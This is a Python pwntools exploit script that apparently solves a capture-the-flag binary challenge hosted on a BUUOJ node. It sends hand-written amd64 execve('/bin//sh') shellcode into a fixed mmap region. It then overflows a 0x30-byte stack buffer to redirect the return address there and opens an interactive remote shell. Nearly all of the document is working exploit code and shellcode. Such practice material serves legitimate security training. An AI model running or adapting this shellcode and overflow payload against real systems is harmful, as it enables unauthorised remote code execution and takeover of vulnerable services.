'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "28456" 
filename = "./pwn"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)


mmap_addr = 0x233000
# notice that buf size is 0x30
appending_size = 0x30 + 8
appending_str = cyclic(appending_size)

shellcode = """
xor rsi,rsi
push rsi
mov rdi,0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 59
pop rax
cdq
syscall
"""

def B():
    gdb.attach(io)
    pause()

def pwn():
    # payload = asm(pwnlib.shellcraft.amd64.linux.sh()) # too long
    payload = asm(shellcode) # 40 limit
    print(len(payload), payload)
    io.sendlineafter(b'Any gift for me?\n', payload)
    payload = appending_str + p64(mmap_addr)
    # B()
    io.sendlineafter(b'Anything else?\n', payload)
    

if __name__ == "__main__":
    pwn()
    io.interactive()
